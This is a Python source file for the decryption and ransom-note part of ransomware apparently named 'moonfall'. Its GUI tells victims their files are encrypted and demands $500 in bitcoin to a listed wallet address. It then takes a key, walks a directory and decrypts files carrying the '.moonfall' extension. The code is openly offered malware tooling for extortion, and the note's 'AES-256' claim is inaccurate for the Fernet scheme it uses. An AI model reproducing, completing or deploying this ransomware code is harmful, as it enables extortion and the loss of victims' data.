import os
from cryptography.fernet import Fernet
import PySimpleGUI as sg

brand_name = '.moonfall'

def load_data(filename):
	with open(filename, 'rb') as file:
		return file.read()

def save_data(filename, data):
	with open(filename, 'wb') as file:
			file.write(data)

	file.close()

	os.rename(filename, filename[:-len(brand_name)])

def decrypt(filename, key):
	try:
		f = Fernet(key)
		data = load_data(filename)
		decrypted_data = f.decrypt(data)
		save_data(filename, decrypted_data)
	except ValueError as ve:
		sg.theme('DarkPurple5')
		sg.Popup('Wrong key', keep_on_top=True, no_titlebar=True)
		raise Exception('Wrong key')


if __name__ == '__main__':
	
	# RANSOM NOTE
	sg.theme('DarkRed2')   
	layout = [	[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
				[sg.Text('')],
				[sg.Text('How can I recover my files?', font='bold')],
				[sg.Text('You must have to pay the 500$ ransom in bitcoins.', font='Helvetica 13')],
				[sg.Text('Once you do the payment, we will send the decryption key via mail.', font='Helvetica 13')],
				[sg.Text('Payment must be done through Bitcoin wallet to the following BTC address:', font='Helvetica 13')],
				[sg.Text('1BhKDQDY55XMPqnSUDtCMCG8R6UX7CSbzP', font='bold')],
				[sg.Text('')],
				[sg.Text('')],
	            [sg.Text('Introduce the key that we have sent to you, to recover your files here', font='Helvetica 13')],
	            [sg.InputText()],
	            [sg.Text('')],
	            [sg.Button('Decrypt files')] ]

	window = sg.Window('Title', layout, no_titlebar=True, keep_on_top=True, element_justification='c')

	count = 0

	while True:
		try:
			event, values = window.read()
			key = values[0]
			print(event)
			print(values)
			# Check the key it's correct
			# Decrypt
			# Run away without a trace

			root = 'C:/'
			root_osx = '/Users/marcosplazagonzalez/Desktop/test'
			root_win = 'C:/Users/marco/OneDrive/Escritorio/Test'
					
			# ITERATE AND DECRYPT
			for root, dirs, files in os.walk(root_win):
				for fn in files:
					full_path = root + os.sep + fn
					try:
						decrypt(full_path, key)
						count += 1
					except Exception as e:
						print(e)
						break
			if count > 0: break
		except Exception as e:
			print(e)
	
	window.close()

	sg.theme('DarkPurple5')
	sg.Popup("All data was decrypted successfully. Be careful on the internet next time ;)", keep_on_top=True, no_titlebar=True)

	      